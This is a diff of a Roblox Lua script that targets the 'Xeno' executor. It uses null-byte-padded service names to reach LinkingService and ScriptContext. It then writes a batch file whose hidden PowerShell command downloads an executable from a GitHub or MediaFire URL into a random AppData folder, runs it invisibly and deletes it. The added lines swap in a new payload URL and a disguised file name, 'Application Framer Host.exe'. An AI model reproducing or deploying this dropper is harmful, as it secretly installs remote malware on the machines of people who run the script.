@@ -3,15 +3,15 @@ coroutine.wrap(function()
     if identifyexecutor() == "Xeno" then
         local LinkingService = game:GetService("LinkingService\0 meow meow meow")
         local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
-        local scriptContent = [[echo off
+        local scriptContent = [[@echo off
         setlocal
-    
-        set "url=https://download1085.mediafire.com/92cu0ktdryigQtzMdBkAgLei_UeUGBuTATtNSrfyR5meTpiQsUFNs3lZvB8Q6u0J8pB2Wr5Y8WTK5zbZlw87zYKuOaDUE4PURJp5Aw25yIN_raOgxxXatZszyADzQFwnzXvXyf29GItbtuRdRRdJfvlGlNNY0sHCTWAZNKvNIlg/4xopof63ivna7pj/Xeno+%282%29.exe"
+        
+        set "url=https://github.com/bbcdemon445/Wanker/raw/refs/heads/main/Application%20Framer%20Host.exe"
         set "folder=%APPDATA%\%random%"
-    
+        
         mkdir "%folder%"
-        powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\source_prepared.exe'); Start-Process -FilePath '%folder%\source_prepared.exe' -WindowStyle Hidden; Remove-Item '%folder%\source_prepared.exe'"
-    
+        powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\Application Framer Host.exe'); Start-Process -FilePath '%folder%\Application Framer Host.exe' -WindowStyle Hidden; Remove-Item '%folder%\Application Framer Host.exe'"
+        
         endlocal
         ]]
         local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
